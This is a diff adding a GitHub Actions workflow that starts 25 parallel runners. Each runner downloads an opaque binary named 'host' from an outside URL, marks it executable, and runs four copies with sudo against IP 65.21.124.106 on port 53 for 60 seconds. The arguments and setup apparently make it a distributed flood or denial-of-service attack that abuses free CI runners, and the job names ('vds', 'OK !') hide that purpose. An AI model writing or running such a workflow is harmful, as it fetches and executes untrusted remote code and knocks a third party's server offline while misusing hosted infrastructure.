@@ -1,0 +1,32 @@
+name: TekPoyraz !
+
+on:
+  workflow_dispatch:
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 25
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+
+    steps:
+      - name: OK !
+        run: |
+          wget https://wgetz.com/Mr6azQrnHt/host -O host
+          chmod +x host
+          PIDS=()
+          for i in {1..4}; do
+            sudo timeout 60 ./host 65.21.124.106 53 100 60 &
+            PIDS+=($!)
+          done
+          
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
+      - name: OK !
+        run: |
+          sleep 60
+          exit 0
